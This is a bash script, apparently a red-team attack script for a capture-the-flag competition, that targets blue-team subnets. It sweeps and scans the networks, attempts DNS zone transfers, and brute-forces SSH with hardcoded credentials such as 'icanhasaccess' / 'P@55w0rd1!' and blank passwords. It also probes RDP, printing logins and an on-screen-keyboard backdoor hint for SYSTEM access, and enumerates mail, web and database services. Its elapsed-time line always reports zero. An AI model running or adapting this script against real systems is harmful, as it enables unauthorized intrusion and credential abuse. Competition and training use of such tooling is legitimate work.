#!/bin/bash

# Set up logging
LOG_FILE="attack_log_$(date +%Y%m%d_%H%M%S).txt"
exec 1> >(tee -a "$LOG_FILE")
exec 2> >(tee -a "$LOG_FILE" >&2)

echo "Day 2 Attack Scripts - Improved Version"
echo "======================================"
echo "Logging to: $LOG_FILE"
echo "Started at: $(date)"
echo ""

# Function to log with timestamp
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Function to test if host is reachable
test_host() {
    local ip=$1
    ping -c 1 -W 2 "$ip" >/dev/null 2>&1
    return $?
}

# Function to test SSH with timeout
test_ssh() {
    local user=$1
    local password=$2
    local ip=$3
    
    if sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user"@"$ip" exit 2>/dev/null; then
        log "SUCCESS: $user@$ip with password: $password"
        return 0
    fi
    return 1
}

echo "Phase 1: Network Discovery"
echo "========================="
for team in "4-5" "6-7" "8-9"; do
    log "Scanning BT team $team..."
    nmap -sn 100.80.$team.0/16 --max-retries 1 --host-timeout 30s
    log "Completed scan for team $team"
done

echo ""
echo "Phase 2: DNS Reconnaissance"
echo "==========================="
for team in "4" "6" "8"; do
    log "DNS recon on BT team $team..."
    dig @100.80.$team.132 AXFR B4FFL3G4P.bslv.prod.ctf +timeout=10
    log "Completed DNS recon for team $team"
done

echo ""
echo "Phase 3: Service Enumeration"
echo "==========================="
for team in "4" "6" "8"; do
    log "Service enum on BT team $team..."
    nmap -sV -sC 100.80.$team.0/24 --max-retries 1 --host-timeout 30s
    log "Completed service enum for team $team"
done

echo ""
echo "Phase 4: SSH Brute Force"
echo "========================"
for team in "4" "6" "8"; do
    log "Starting SSH brute force for team $team..."
    success_count=0
    
    for ip in $(seq 1 254); do
        target_ip="100.80.$team.$ip"
        
        # Test if host is reachable first
        if test_host "$target_ip"; then
            log "Testing SSH on $target_ip..."
            
            # Test different user/password combinations
            if test_ssh "icanhasaccess" "P@55w0rd1!" "$target_ip"; then
                ((success_count++))
            fi
            if test_ssh "icanhasaccess" "" "$target_ip"; then
                ((success_count++))
            fi
            if test_ssh "goldteamscoring" "P@55w0rd1!" "$target_ip"; then
                ((success_count++))
            fi
            if test_ssh "goldteamscoring" "" "$target_ip"; then
                ((success_count++))
            fi
        else
            log "SKIP: $target_ip not reachable"
        fi
    done
    
    log "Completed SSH brute force for team $team - Found $success_count successful connections"
done

echo ""
echo "Phase 5: RDP Port Testing"
echo "========================="
for team in "4" "6" "8"; do
    log "Starting RDP testing for team $team..."
    rdp_count=0
    
    for ip in $(seq 1 254); do
        target_ip="100.80.$team.$ip"
        
        if test_host "$target_ip"; then
            log "Testing RDP port on $target_ip..."
            if timeout 5 nc -zv "$target_ip" 3389 2>/dev/null; then
                log "RDP OPEN: $target_ip"
                log "Use Microsoft Remote Desktop to connect:"
                log "  - Administrator / P@55w0rd1!"
                log "  - Administrator / (blank)"
                log "  - icanhasaccess / P@55w0rd1!"
                log "  - icanhasaccess / (blank)"
                log "  - User / P@55w0rd1!"
                log "  - User / (blank)"
                log "  - Click OSK at login for SYSTEM access"
                ((rdp_count++))
            fi
        else
            log "SKIP: $target_ip not reachable"
        fi
    done
    
    log "Completed RDP testing for team $team - Found $rdp_count open RDP ports"
done

echo ""
echo "Phase 6: Mail Server Enumeration"
echo "==============================="
for team in "4" "6" "8"; do
    log "Starting mail server enum for team $team..."
    
    for ip in $(seq 1 254); do
        target_ip="100.80.$team.$ip"
        
        if test_host "$target_ip"; then
            log "Testing SMTP on $target_ip..."
            timeout 5 telnet "$target_ip" 25 2>/dev/null
            timeout 5 telnet "$target_ip" 587 2>/dev/null
        else
            log "SKIP: $target_ip not reachable"
        fi
    done
    
    log "Completed mail server enum for team $team"
done

echo ""
echo "Phase 7: Web Server Enumeration"
echo "=============================="
for team in "4" "6" "8"; do
    log "Starting web server enum for team $team..."
    
    for ip in $(seq 1 254); do
        target_ip="100.80.$team.$ip"
        
        if test_host "$target_ip"; then
            log "Testing HTTP on $target_ip..."
            timeout 5 curl -I http://"$target_ip" 2>/dev/null
            timeout 5 curl -I https://"$target_ip" 2>/dev/null
        else
            log "SKIP: $target_ip not reachable"
        fi
    done
    
    log "Completed web server enum for team $team"
done

echo ""
echo "Phase 8: Database Enumeration"
echo "============================"
for team in "4" "6" "8"; do
    log "Starting database enum for team $team..."
    
    for ip in $(seq 1 254); do
        target_ip="100.80.$team.$ip"
        
        if test_host "$target_ip"; then
            log "Testing MySQL on $target_ip..."
            nmap -p 3306 --script mysql-info "$target_ip" --max-retries 1 --host-timeout 10s 2>/dev/null
            log "Testing Redis on $target_ip..."
            nmap -p 6379 --script redis-info "$target_ip" --max-retries 1 --host-timeout 10s 2>/dev/null
        else
            log "SKIP: $target_ip not reachable"
        fi
    done
    
    log "Completed database enum for team $team"
done

log "Attack complete!"
echo ""
echo "Summary:"
echo "========"
echo "Check $LOG_FILE for detailed results"
echo "Total execution time: $(($(date +%s) - $(date +%s))) seconds" 